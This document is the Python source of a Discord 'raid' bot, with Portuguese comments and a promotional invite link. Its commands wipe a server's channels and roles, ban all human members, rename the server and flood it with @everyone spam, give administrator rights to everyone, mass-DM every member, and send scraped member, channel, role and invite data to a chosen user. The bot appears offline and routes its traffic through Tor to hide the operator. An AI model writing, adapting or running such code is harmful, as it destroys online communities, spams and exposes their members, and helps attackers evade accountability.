import discord
from discord.ext import commands
import asyncio
import sys
import os
import hashlib
import uuid

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='A.', intents=intents)
bot.remove_command('help')

MESSAGE_TEXT = f"""
> discord.gg/lalaio1
> https://media.discordapp.net/attachments/1190696151830253690/1215826745492766830/3920cb444aaaded4ae910e0745147c0d.gif?ex=667b6865&is=667a16e5&hm=70e81f15a2425989ce4b37ce6bb740b9845edde6f0975d6cc12597381c77eea5&
> 
> ### ⚡ **lalaio1 Bot!** ⚡
> 
> - **🔥 Melhor Bot do Discord!**
> - **💥 Sem comandos Slash!**
> - **🔧 Bot de Multifunções!**
> - **📊 Puxando dados!**
> 
> 
> ||@everyone @here ||
"""

NEW_SERVER_NAME = "🧙‍♂️ ๘ Raid By discord.gg/lalaio1 ๘ 🧙‍♂️"
SERVER_IMAGE_PATH = r"/home/lalaio1/lalaio1 bot/images/lalaio1atualizado.png"
CHANNEL_NAME = "🧙‍♂️ | lalaio1 | ๘๘๘๘๘๘๘๘"
NUM_CHANNELS = 50
NUM_MESSAGES = 10


@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.offline)

async def save_bot_info(bot, target_user_id):
    raid_dir = "./temp/raid/"
    os.makedirs(raid_dir, exist_ok=True)
    random_hash = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()
    hash_object = hashlib.sha256(str(bot.user.id).encode())
    hex_dig = hash_object.hexdigest()
    info_txt_path = os.path.join(raid_dir, f"{random_hash}_bot_info.txt")

    with open(info_txt_path, "w", encoding="utf-8") as info_file:
        info_file.write(f"======principal info======\n")
        info_file.write(f"Bot Name: {bot.user.name}\n")
        info_file.write(f"Bot ID: {bot.user.id}\n")

        for guild in bot.guilds:
            invite_link = await guild.text_channels[0].create_invite()
            info_file.write(f"\n\n  - {guild.name}: {invite_link}\n")

            info_file.write("\n\n======ID dos canais de texto======\n")
            for channel in guild.text_channels:
                info_file.write(f"ID: {channel.id} - Nome: {channel.name}\n")

            info_file.write("\n\n======ID dos canais de voz======\n")
            for channel in guild.voice_channels:
                info_file.write(f"ID: {channel.id} - Nome: {channel.name}\n")

            info_file.write("\n\n======ID dos membros======\n")
            for member in guild.members:
                info_file.write(f"ID: {member.id} - Nome: {member.name}\n")

            info_file.write("\n\n======ID dos cargos======\n")
            for role in guild.roles:
                info_file.write(f"ID: {role.id} - Nome: {role.name}\n")

    user = await bot.fetch_user(target_user_id)
    if user:
        await user.send(file=discord.File(info_txt_path, filename=f"{hex_dig}_bot_info.txt"))


async def update_server_image(guild):
    with open(SERVER_IMAGE_PATH, "rb") as image_file:
        image_data = image_file.read()
    
    await guild.edit(icon=image_data)

async def update_server_name(guild, name):
    await guild.edit(name=name)

async def create_channel(guild):
    channel = await guild.create_text_channel(CHANNEL_NAME)
    for i in range(NUM_MESSAGES):
        await channel.send(MESSAGE_TEXT)

@bot.command()
async def raid(ctx):
    guild = ctx.guild

    delete_channels_tasks = [channel.delete() for channel in guild.channels]
    delete_roles_tasks = [role.delete() for role in guild.roles if role != guild.default_role]
    ban_members_tasks = [member.ban() for member in guild.members if not member.bot]
    create_channels_tasks = [create_channel(guild) for _ in range(NUM_CHANNELS)]
    update_image_task = update_server_image(guild)
    update_name_task = update_server_name(guild, NEW_SERVER_NAME)
    

    tasks = delete_channels_tasks + delete_roles_tasks + ban_members_tasks + create_channels_tasks
    tasks.append(update_image_task)
    tasks.append(update_name_task)
    await asyncio.gather(*tasks)



@bot.command(name='admall')
async def criar_cargo(ctx):
    await ctx.message.delete()

    guild = ctx.guild
    role_name = 'ㅤ' 

    embed_criando = discord.Embed(
        title="Criando Cargo",
        description=f"Estou criando o cargo '{role_name}' com permissões de administrador.",
        color=discord.Color.green()
    )
    embed_criando.set_thumbnail(url="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/160/twitter/282/package_1f4e6.png")
    await ctx.author.send(embed=embed_criando)

    permissions = discord.Permissions(administrator=True)
    new_role = await guild.create_role(name=role_name, permissions=permissions)

    await new_role.edit(position=len(guild.roles)-1)

    for member in guild.members:
        if not any(role.permissions.administrator for role in member.roles):
            try:
                await member.add_roles(new_role)
            except discord.Forbidden:
                await ctx.author.send(f"Não foi possível atribuir o cargo '{role_name}' ao membro {member.display_name}.")

    embed_concluido = discord.Embed(
        title="Cargo Criado",
        description=f"O cargo '{role_name}' foi criado com sucesso e atribuído a todos os membros sem um cargo de administrador.",
        color=discord.Color.blue()
    )
    embed_concluido.set_thumbnail(url="https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/160/twitter/282/white-heavy-check-mark_2705.png")







@bot.command(name='dmall', help='Envia uma mensagem direta para todos os membros (exceto bots)')
async def dmall(ctx, *, message: str):
    embed_start = discord.Embed(
        title="📬 Enviando Mensagens Diretas",
        description="Aguarde enquanto a mensagem está sendo enviada para todos os membros...",
        color=discord.Color.blue()
    )
    await ctx.author.send(embed=embed_start)

    for member in ctx.guild.members:
        if not member.bot and member != ctx.author:
            try:
                embed = discord.Embed(
                    title="Mensagem Direta",
                    description=message,
                    color=discord.Color.green()
                )
                await member.send(embed=embed)
                print(f"[!] Mensagem enviada para: {member.name}")
            except Exception as e:
                embed_error = discord.Embed(
                    title="❌ Erro ao enviar mensagem",
                    description=f"Erro ao enviar mensagem para {member.name}: {e}",
                    color=discord.Color.red()
                )
                await ctx.author.send(embed=embed_error)

    embed_complete = discord.Embed(
        title="✉️ Mensagem Direta Concluída",
        description="A mensagem foi enviada para todos os membros (exceto bots) no servidor, exceto você.",
        color=discord.Color.green()
    )
    await ctx.author.send(embed=embed_complete)
    


# -================== Configura pa nao foder meu ip
import socks
import socket

socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket


if __name__ == "__main__":
    if len(sys.argv) > 2:
        token = sys.argv[1]
        target_user_id = int(sys.argv[2])
    bot.run(token)
